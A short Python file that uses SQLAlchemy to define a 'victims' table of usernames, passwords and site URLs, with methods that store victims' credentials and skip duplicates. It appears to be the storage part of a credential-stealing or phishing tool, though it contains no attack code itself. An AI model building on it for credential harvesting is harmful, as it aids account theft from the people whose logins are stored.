from sqlalchemy import create_engine, Table, Column, Integer, String, ForeignKey, MetaData
from sqlalchemy.orm import sessionmaker
from sqlalchemy.ext.declarative import declarative_base

# create a base class for ORM objects
Base = declarative_base()

# define a mapped class for the users table
class Victim(Base):
    __tablename__ = 'victims'

    id = Column(Integer, primary_key=True)
    username = Column(String)
    password = Column(String)
    url = Column(String)

    def __str__(self) -> str:
        return f"{self.username}, {self.password}, {self.url}"

    def __repr__(self) -> str:
        return f"{self.username}, {self.password}, {self.url}"

class DB:
    def __init__(self, db_str) -> None:
        self.engine = create_engine(db_str)
        self.Session = sessionmaker(bind=self.engine)
        Base.metadata.create_all(self.engine)

    def insert_victim(self, user, pwd, site):
        session = self.Session()
        victim=Victim(username=user, password=pwd, url=site)
        exists = session.query(Victim).filter_by(username=user,password=pwd,url=site).first() is not None
        if not exists:
            session.add(victim)
            session.commit()
        session.close()

    def insert_victims(self, victims):
        session = self.Session()
        count = 0
        for victim in victims:
            exists = session.query(Victim).filter_by(username=victim['username'],password=victim['password'],url=victim['url']).first() is not None
            
            if not exists:
                print(victim)
                session.add(Victim(username=victim['username'],password=victim['password'],url=victim['url']))
                count+=1
        session.commit()
        session.close()
        return count
  